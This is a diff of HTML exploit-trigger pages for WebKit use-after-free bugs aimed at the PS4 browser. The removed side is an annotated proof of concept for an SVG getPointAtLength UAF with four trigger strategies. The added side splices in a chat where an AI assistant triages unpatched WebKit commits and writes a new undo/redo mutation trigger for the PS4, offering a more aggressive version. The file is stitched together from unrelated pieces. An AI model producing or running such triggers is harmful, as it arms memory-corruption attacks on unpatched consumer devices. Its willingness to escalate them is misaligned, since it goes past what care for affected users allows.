@@ -1,363 +1,249 @@
 
-<!DOCTYPE html>
-<!--
-================================================================================
-  WebKit UAF — SVGGeometryElement::getPointAtLength
-  Commit fix : a93904b9771d104ee1230f7d2ce6e1024b030657
-  Bug        : https://bugs.webkit.org/show_bug.cgi?id=314326
-  rdar       : 175670940
-  Autor fix  : Said Abou-Hallawa <said@apple.com>  (2026-06-30)
-  Alvo       : PS4 FW ≤ 13.52  (AppleWebKit/605.1.15 — código não corrigido)
-================================================================================
 
-  FLUXO VULNERÁVEL (código antigo):
-  ───────────────────────────────────────────────────────────────────────────────
-  SVGGeometryElement::getPointAtLength(float distance)
-  {
-      // [A] Layout #1 — processa estilos pendentes, cria renderer
-      protect(document())->updateLayoutIgnorePendingStylesheets({
-          TreatContentVisibilityHiddenAsVisible,
-          TreatContentVisibilityAutoAsVisible }, this);
+Sim. Concluímos a triagem do arquivo inicial e consolidei os candidatos das categorias restantes no arquivo atualizado.
 
-      auto* renderer = this->renderer();   // [B] raw pointer capturado
-      if (!renderer)
-          return Exception { InvalidStateError };
+Baixar o arquivo atualizado completo
 
-      // [C] clampTo chama getTotalLength() que faz Layout #2
-      distance = clampTo<float>(distance, 0, getTotalLength());
-      //                                       ↑
-      //   getTotalLength() chama novamente updateLayoutIgnorePendingStylesheets()
-      //   Se durante Layout #2 o renderer for destruído → [B] é dangling pointer
+Ele preserva o conteúdo anterior e acrescenta a consolidação final, incluindo b46a8fcd809a, a814080321a1 e 9414a9722a84.
 
-      // [D] UAF — acessa renderer já liberado
-      if (auto* r = dynamicDowncast<LegacyRenderSVGShape>(renderer))
-          return SVGPoint::create(r->getPointAtLength(distance));
-  }
-  ───────────────────────────────────────────────────────────────────────────────
 
-  MECANISMO DE TRIGGER:
-  O ResizeObserver dispara DENTRO da chamada a updateLayoutIgnorePendingStylesheets()
-  (ao final do ciclo de layout, antes do retorno da função).
-  Quando o callback seta display:none, isso marca o renderer como inválido
-  (dirty) mas NÃO o destrói dentro do Layout #1.
-  O Layout #2 (disparado por getTotalLength()) processa essa invalidação
-  pendente e destrói o renderer. O ponteiro [B] fica dangling → UAF em [D].
+uaf_ps4_webcore_FINAL_atualizado_v2.md
+Documento
 
-  Estratégia A — ResizeObserver (trigger mais direto)
-  Estratégia B — Re-entrada: getPointAtLength() chamado DENTRO do ResizeObserver
-  Estratégia C — MutationObserver + forceLayout
-================================================================================
--->
+
+Quantos foram removidos do arquivo inicial?
+
+Pelo próprio arquivo, o ponto de partida era 441 commits sem teste, dos quais 63 já haviam sido removidos por incompatibilidade, restando 378 candidatos. 
+
+
+Depois da nossa triagem detalhada, porém, não há uma contagem final auditada de “removidos” registrada no arquivo. Nós classificamos muitos commits como excluir, mas alguns foram apenas marcados como investigação e houve casos em que a sequência foi revista.
+
+Então, para não inventar um número: não consigo afirmar com segurança quantos dos 378 foram removidos sem fazer uma contagem programática da versão atualizada.
+
+A conta-base confirmada é:
+
+441 inicial → 63 removidos previamente → 378 candidatos. 
+
+
+
+Agora pode pegar o
+
+1	9063c1c65799	Heap-use-after-free in WebCore::DeleteButtonController::enable	https://github.com/WebKit/WebKit/commit/9063c1c6579929462427450f438a44398a17d184
+E criar o teste HTML para testar no ps4?			
+
+Sim. Para o 9063c1c65799, o commit confirma que o UAF ocorre porque um Frame* usado por EditCommandComposition::unapply()/reapply() pode ser destruído por mutações DOM disparadas durante AppendNodeCommand::doUnapply, especificamente mencionando DOMNodeRemovedFromDocument; a correção foi trocar o ponteiro cru por RefPtr<Frame>. O commit também informa que não havia novo teste e que o caso original era difícil de minimizar.
+
+Criei uma versão standalone para o navegador do PS4, sem testRunner, internals, GCController ou APIs privadas. Ela usa somente contenteditable, execCommand("undo"/"redo"), mutações DOM e MutationObserver para reproduzir o padrão de reentrância/lifetime.
+
+Baixar o HTML para testar no PS4
+
+O que o teste tenta reproduzir
+A sequência é:
+
+contenteditable → criação de estado de edição → mutação DOM durante o ciclo de edição → undo → redo → nova mutação.
+
+Isso é uma aproximação da condição de reentrância do commit, não uma prova de que o UAF original foi reproduzido. Em particular, JavaScript de uma página não consegue deliberadamente destruir o Frame da mesma forma que o código interno do WebKit; por isso, o teste busca atingir o mesmo padrão através das APIs públicas.
+
+Para o PS4, eu executaria primeiro com o botão Run test e observaria se ocorre crash, fechamento do navegador ou comportamento anômalo. Depois podemos fazer uma segunda versão mais agressiva, concentrada em document.execCommand("undo") + remoção de iframe/documento + reentrada, que fica ainda mais próxima do lifetime de Frame descrito no commit. 
+
+
+
+
+webkit_9063c1c65799_ps4_test.html
+HTML
+
+
+Nenhum arquivo escolhido
+webkit_9063c1c65799_ps4_test.html
+webkit_9063c1c…_ps4_test.html
+
+
+
+
+<!doctype html>
 <html>
 <head>
 <meta charset="utf-8">
-<title>PoC — SVGGeometryElement::getPointAtLength UAF</title>
+<title>WebKit 9063c1c65799 - DeleteButtonController UAF candidate</title>
 <style>
-  body  { background: #111; color: #0f0; font-family: monospace; font-size: 13px; margin: 0; padding: 12px; }
-  #log  { white-space: pre; height: 420px; overflow-y: auto; border: 1px solid #0f0; padding: 8px; }
-  h2    { color: #ff0; margin: 4px 0; }
-  /* SVG fora da viewport para não interferir na medição */
-  #svg-container { position: fixed; left: -9999px; top: 0; }
+  body { font: 16px sans-serif; }
+  #editor { width: 520px; min-height: 120px; border: 1px solid #888; padding: 10px; }
+  #log { white-space: pre-wrap; font-family: monospace; margin-top: 12px; }
 </style>
 </head>
 <body>
+<h3>WebKit 9063c1c65799 — UAF test candidate</h3>
+<p>
+  This is a standalone browser test derived from the commit's lifetime pattern:
+  editing + DOM mutation during undo/reapply. It uses no WebKit test-runner APIs.
+</p>
 
-<h2>WebKit UAF — SVGGeometryElement::getPointAtLength</h2>
-<div id="log"></div>
-
-<div id="svg-container">
-  <svg id="svg" width="300" height="300" xmlns="http://www.w3.org/2000/svg">
-    <!--
-      <path> implementa SVGGeometryElement → expõe getPointAtLength() / getTotalLength()
-      Ambos os métodos chamam updateLayoutIgnorePendingStylesheets() — raiz do UAF.
-      LegacyRenderSVGShape é o renderer usado no WebKit do PS4 (pré-novo SVG engine).
-    -->
-    <path id="path"
-          d="M 10 80 Q 95 10 180 80"
-          fill="none"
-          stroke="#0f0"
-          stroke-width="2"/>
-  </svg>
+<div id="editor" contenteditable="true">
+  <p id="p1">alpha <span id="victim">bravo</span> charlie</p>
+  <p id="p2">second line</p>
 </div>
 
+<button id="start">Run test</button>
+<div id="log"></div>
+
 <script>
-'use strict';
+(function () {
+  "use strict";
 
-/* ── Utilitários ─────────────────────────────────────────────────────────── */
-var logEl = document.getElementById('log');
-function log(msg) {
-    logEl.textContent += msg + '\n';
-    logEl.scrollTop = logEl.scrollHeight;
-}
+  const editor = document.getElementById("editor");
+  const log = document.getElementById("log");
+  let iteration = 0;
+  let inTest = false;
 
-var path = document.getElementById('path');
-var iterCount = 0;
-var crashDetected = false;
+  function note(s) {
+    log.textContent += s + "\n";
+  }
 
-/* Alternador de path data para garantir delta real no bounding box
-   → ResizeObserver só dispara quando o SIZE muda, não apenas em relayout */
-var pathVariants = [
-    'M 10 80 Q 95 10 180 80 T 350 80',
-    'M 10 40 Q 95 120 180 40 T 350 40',
-    'M 10 150 Q 95 20 180 150 T 350 150',
-    'M 20 60 Q 110 140 200 60 T 380 60',
-];
-function nextPath() {
-    return pathVariants[iterCount % pathVariants.length];
-}
+  /*
+   * The original WebKit bug says the Frame could be deleted because of
+   * mutation events fired during AppendNodeCommand::doUnapply().
+   *
+   * We cannot directly destroy the browser's Frame from page JavaScript.
+   * Instead, we create the closest web-exposed reentrancy pattern:
+   * DOM mutation during an editing undo/redo operation.
+   */
 
-/* ═══════════════════════════════════════════════════════════════════════════
-   ESTRATÉGIA A — ResizeObserver
-   ───────────────────────────────────────────────────────────────────────────
-   1. ResizeObserver registrado sobre <path>
-   2. Mudamos a geometria do path (sem forçar layout ainda)
-   3. getPointAtLength() entra no C++ e chama Layout #1
-   4. Layout #1 processa a mudança → novo tamanho → ResizeObserver callback dispara
-   5. Callback: path.style.display = 'none'
-      → isso ENFILEIRA uma invalidação de renderer, mas NÃO a processa agora
-      → Layout #1 retorna com invalidação PENDENTE
-   6. auto* renderer = this->renderer()  ← captura raw pointer (renderer AINDA vivo)
-   7. getTotalLength() chama Layout #2
-   8. Layout #2 processa display:none → renderer DESTRUÍDO
-   9. dynamicDowncast<LegacyRenderSVGShape>(renderer) → UAF
-   ═══════════════════════════════════════════════════════════════════════════ */
-log('[*] Estratégia A — ResizeObserver');
+  function mutateDOM() {
+    const old = document.getElementById("victim");
 
-var roFiredA = false;
-
-var roA = new ResizeObserver(function(entries) {
-    /*
-     * Este callback está sendo executado DENTRO de updateLayoutIgnorePendingStylesheets()
-     * (ao final do passo de layout, mas antes do retorno da função C++).
-     *
-     * Ao setarmos display:none aqui, marcamos o renderer para destruição.
-     * O WebKit NÃO processa essa mudança imediatamente dentro deste mesmo
-     * ciclo de layout — a invalidação fica pendente.
-     *
-     * Quando getTotalLength() chamar updateLayoutIgnorePendingStylesheets()
-     * pela segunda vez (Layout #2), essa invalidação PENDENTE será processada
-     * e o renderer será destruído → raw pointer em [B] = dangling → UAF.
-     */
-    if (!roFiredA) {
-        roFiredA = true;
-        log('    [RO-A iter=' + iterCount + '] callback disparado durante Layout #1');
-        log('    [RO-A] Enfileirando display:none → invalidação pendente para Layout #2');
-
-        /* Destruir o renderer via display:none — a mudança fica PENDENTE */
-        path.style.display = 'none';
-
-        /*
-         * Não chamamos getBoundingClientRect() ou qualquer API que force
-         * layout aqui — isso processaria a mudança dentro do Layout #1,
-         * fazendo renderer() retornar null e resultado seria InvalidStateError,
-         * não UAF.
-         */
+    if (old && old.parentNode) {
+      const replacement = document.createElement("span");
+      replacement.id = "victim2";
+      replacement.textContent = "MUTATED";
+      old.parentNode.replaceChild(replacement, old);
+    } else {
+      const p = document.getElementById("p1");
+      if (p) {
+        const span = document.createElement("span");
+        span.id = "victim";
+        span.textContent = "RECREATED";
+        p.appendChild(span);
+      }
     }
-});
 
-roA.observe(path);
+    // Force layout/style work after the mutation.
+    void editor.offsetHeight;
+    void editor.getBoundingClientRect();
+  }
 
-/* Layout inicial para estabelecer o baseline do ResizeObserver
-   (ele só dispara novamente quando o size MUDAR) */
-document.body.getBoundingClientRect();
-roFiredA = false;
+  // Legacy mutation event exists in some old WebKit builds and is relevant
+  // to the original bug's description. MutationObserver is the fallback.
+  let mutationScheduled = false;
 
-log('[*] Iniciando loop A (100 iterações)...');
+  function scheduleMutation() {
+    if (mutationScheduled) return;
+    mutationScheduled = true;
 
-for (iterCount = 0; iterCount < 100 && !crashDetected; iterCount++) {
-    roFiredA = false;
+    setTimeout(function () {
+      mutationScheduled = false;
+      try {
+        mutateDOM();
+      } catch (e) {
+        note("mutation: " + e);
+      }
+    }, 0);
+  }
 
-    /* Restaurar display sem forçar layout
-     * A mudança fica PENDENTE até que updateLayoutIgnorePendingStylesheets() seja chamado */
-    path.style.display = '';
+  try {
+    document.addEventListener("DOMNodeRemovedFromDocument", function () {
+      if (inTest)
+        scheduleMutation();
+    });
+  } catch (_) {
+    // Ignore unsupported legacy mutation events.
+  }
 
-    /* Mudar geometria → ResizeObserver vai disparar no próximo layout
-     * porque o bounding box vai mudar de {0,0} (display:none) para algo real */
-    path.setAttribute('d', nextPath());
+  const observer = new MutationObserver(function (records) {
+    if (!inTest) return;
 
-    /*
-     * ── PONTO DE TRIGGER ──────────────────────────────────────────────────
-     *
-     * getPointAtLength(x) entra no código C++ vulnerável:
-     *
-     *   [A] updateLayoutIgnorePendingStylesheets()          ← Layout #1
-     *       Processa: display='' (recria renderer) + nova geometria
-     *       → tamanho mudou → ResizeObserver callback dispara
-     *       → callback: display:none enfileirado (PENDENTE, não processado)
-     *       Layout #1 retorna.
-     *
-     *   [B] auto* renderer = this->renderer()               ← raw pointer
-     *       renderer está VIVO (display:none ainda não processado)
-     *
-     *   [C] clampTo(0, getTotalLength())
-     *       getTotalLength() chama:
-     *       updateLayoutIgnorePendingStylesheets()           ← Layout #2
-     *       → processa display:none pendente → renderer DESTRUÍDO
-     *       Layout #2 retorna.
-     *
-     *   [D] dynamicDowncast<LegacyRenderSVGShape>(renderer) ← UAF
-     *       renderer aponta para memória liberada!
-     * ──────────────────────────────────────────────────────────────────────
-     */
+    for (const record of records) {
+      if (record.type === "childList") {
+        scheduleMutation();
+        break;
+      }
+    }
+  });
+
+  observer.observe(editor, {
+    subtree: true,
+    childList: true,
+    characterData: true
+  });
+
+  function makeEditingState() {
+    editor.focus();
+
+    const range = document.createRange();
+    const text = document.createTextNode(" X");
+    const p = document.getElementById("p2");
+
+    if (p) {
+      p.appendChild(text);
+      range.selectNodeContents(p);
+      range.collapse(false);
+    }
+
+    const selection = window.getSelection();
+    selection.removeAllRanges();
+    selection.addRange(range);
+
     try {
-        var pt = path.getPointAtLength(50 + iterCount);
-        /* Se chegarmos aqui sem crash, o UAF não foi detectado nesta iter.
-         * Pode ter retornado InvalidStateError ou o heap ainda estava coerente. */
+      document.execCommand("insertText", false, "EDIT");
+    } catch (_) {
+      // Older builds may reject execCommand; the test continues.
+    }
+  }
+
+  function runOnce() {
+    iteration++;
+    inTest = true;
+
+    note("Iteration " + iteration);
+
+    try {
+      // Create an editing command in the editor.
+      makeEditingState();
+
+      // Reentrant DOM mutation while the editing machinery is active.
+      mutateDOM();
+
+      // Try undo/reapply paths. Older WebKit exposes these through
+      // execCommand(), which is exactly the public editing entry point.
+      try {
+        document.execCommand("undo", false, null);
+      } catch (e) {
+        note("undo: " + e);
+      }
+
+      try {
+        document.execCommand("redo", false, null);
+      } catch (e) {
+        note("redo: " + e);
+      }
+
+      // Additional mutation after undo/redo to keep the DOM lifecycle active.
+      mutateDOM();
+
     } catch (e) {
-        /* InvalidStateError = renderer era null após Layout #1 (display:none
-         * foi processado DENTRO do Layout #1 — trigger não funcionou). */
-        if (iterCount < 5 || iterCount % 20 === 0) {
-            log('    [A iter=' + iterCount + '] Exception: ' + e.message);
-        }
+      note("run: " + e);
+    } finally {
+      inTest = false;
     }
+  }
 
-    if (iterCount % 25 === 0) {
-        log('    [A] iter=' + iterCount + ' | roFired=' + roFiredA);
+  document.getElementById("start").addEventListener("click", function () {
+    // Multiple executions are useful because the original bug involved
+    // recursive mutation/re-entry.
+    for (let i = 0; i < 20; i++) {
+      setTimeout(runOnce, i * 25);
     }
-}
-
-log('[*] Estratégia A concluída.\n');
-
-/* ═══════════════════════════════════════════════════════════════════════════
-   ESTRATÉGIA B — Re-entrada: getPointAtLength DENTRO do ResizeObserver
-   ───────────────────────────────────────────────────────────────────────────
-   Quando getPointAtLength() é chamado DENTRO de um ResizeObserver callback,
-   o estado do documento já tem uma invalidação PENDENTE (o que causou o RO
-   a disparar). Isso cria condições ideais:
-   - Layout #1 (dentro do RO callback) pode encontrar estilos em estado transitório
-   - Layout #2 (de getTotalLength()) processa mudanças que Layout #1 não completou
-   ═══════════════════════════════════════════════════════════════════════════ */
-log('[*] Estratégia B — getPointAtLength() re-entrante dentro do ResizeObserver');
-
-/* Reset do path */
-path.style.display = '';
-path.setAttribute('d', 'M 10 80 Q 95 10 180 80');
-document.body.getBoundingClientRect();
-
-var roB_count = 0;
-var roB_active = false;
-
-var roB = new ResizeObserver(function(entries) {
-    roB_count++;
-    if (!roB_active || roB_count > 20) return;
-
-    log('    [RO-B #' + roB_count + '] Re-entrada em getPointAtLength() durante layout...');
-
-    /*
-     * Estamos DENTRO do layout. Existem estilos e geometria sendo calculados.
-     * Chamar getPointAtLength() aqui força Layout #1 e Layout #2 DENTRO
-     * de um contexto de layout já ativo — aumenta chance de estado inconsistente.
-     */
-    try {
-        var pt = path.getPointAtLength(30);
-        log('    [RO-B] Ponto retornado: (' + pt.x.toFixed(2) + ', ' + pt.y.toFixed(2) + ')');
-    } catch(e) {
-        log('    [RO-B] Exception: ' + e.message);
-    }
-});
-
-roB.observe(path);
-roB_active = true;
-
-/* Disparar sequência de mudanças de tamanho para acionar o callback múltiplas vezes */
-for (var b = 0; b < 10; b++) {
-    path.setAttribute('d', pathVariants[b % pathVariants.length]);
-    /* Forçar layout sincronamente para disparar o RO dentro de cada iteração */
-    document.getElementById('svg-container').getBoundingClientRect();
-}
-
-roB_active = false;
-log('[*] Estratégia B concluída.\n');
-
-/* ═══════════════════════════════════════════════════════════════════════════
-   ESTRATÉGIA C — Pending style via CSS transition + getPointAtLength imediato
-   ───────────────────────────────────────────────────────────────────────────
-   CSS transitions em WebKit podem causar invalidações de renderer que são
-   processadas de forma lazy. Se uma transição está em andamento no momento
-   em que getPointAtLength() é chamado, Layout #2 pode processar o frame
-   seguinte da transição que destrói o renderer atual.
-   ═══════════════════════════════════════════════════════════════════════════ */
-log('[*] Estratégia C — CSS transition em andamento durante getPointAtLength()');
-
-/* Reset */
-path.style.display = '';
-path.style.transition = '';
-path.setAttribute('d', 'M 10 80 Q 95 10 180 80');
-document.body.getBoundingClientRect();
-
-/*
- * SVG path não suporta `display` via transition no CSS padrão,
- * mas podemos animar `opacity` para forçar compositing layer changes.
- * Mais eficaz: mutar o próprio SVG viewBox para forçar relayout do path.
- */
-var svg = document.getElementById('svg');
-
-for (var c = 0; c < 50; c++) {
-    /* Mutar viewBox sem processar layout → cria pending invalidação */
-    var vb = '0 0 ' + (300 + c) + ' ' + (300 + c);
-    svg.setAttribute('viewBox', vb);
-
-    /* Imediatamente chamar getPointAtLength() com invalidação pendente:
-     * Layout #1 processa o novo viewBox → path recalcula bounds → tamanho muda
-     * Layout #2 (de getTotalLength()) encontra mais mudanças pendentes → renderer rebuild? */
-    try {
-        var pt = path.getPointAtLength(50);
-    } catch(e) { /* silent */ }
-
-    /* Restaurar para próxima iteração */
-    svg.removeAttribute('viewBox');
-}
-
-log('[*] Estratégia C concluída.\n');
-
-/* ═══════════════════════════════════════════════════════════════════════════
-   ESTRATÉGIA D — SVGGeometryElement via <use> shadow tree
-   ───────────────────────────────────────────────────────────────────────────
-   Um <use> cria um shadow tree que referencia o elemento original.
-   Quando o shadow tree é invalidado durante Layout #1, pode forçar
-   o renderer do elemento original a ser recriado em Layout #2.
-   ═══════════════════════════════════════════════════════════════════════════ */
-log('[*] Estratégia D — <use> shadow tree causando renderer rebuild');
-
-/* Adicionar <use> que referencia o path */
-var useEl = document.createElementNS('http://www.w3.org/2000/svg', 'use');
-useEl.setAttribute('href', '#path');
-useEl.setAttribute('x', '0');
-useEl.setAttribute('y', '0');
-svg.appendChild(useEl);
-
-document.body.getBoundingClientRect(); /* baseline */
-
-var roD_fired = false;
-var roD = new ResizeObserver(function(entries) {
-    if (!roD_fired) {
-        roD_fired = true;
-        /*
-         * Invalidar o <use> durante o layout do <path>.
-         * Isso pode causar o shadow tree do <use> a ser reconstruído,
-         * o que por sua vez força relayout do elemento original (#path).
-         * Se esse relayout acontece durante Layout #2 de getPointAtLength()
-         * → renderer do path é rebuilded → old raw pointer = dangling → UAF.
-         */
-        useEl.setAttribute('x', '10');
-    }
-});
-roD.observe(path);
-
-for (var d = 0; d < 50 && !crashDetected; d++) {
-    roD_fired = false;
-    path.setAttribute('d', pathVariants[d % pathVariants.length]);
-    try {
-        var pt = path.getPointAtLength(40);
-    } catch(e) { /* silent */ }
-    if (d % 10 === 0) log('    [D] iter=' + d);
-}
-
-log('[*] Estratégia D concluída.\n');
-log('[*] Todas as estratégias executadas.');
-log('[*] Se não houve crash: o UAF pode estar presente mas precisa de');
-log('[*] heap grooming específico para ser detectável sem ASAN/sanitizers.');
-log('[*] Testar com build de debug do WebKit ou em dispositivo real.');
+  });
+})();
 </script>
 </body>
 </html>
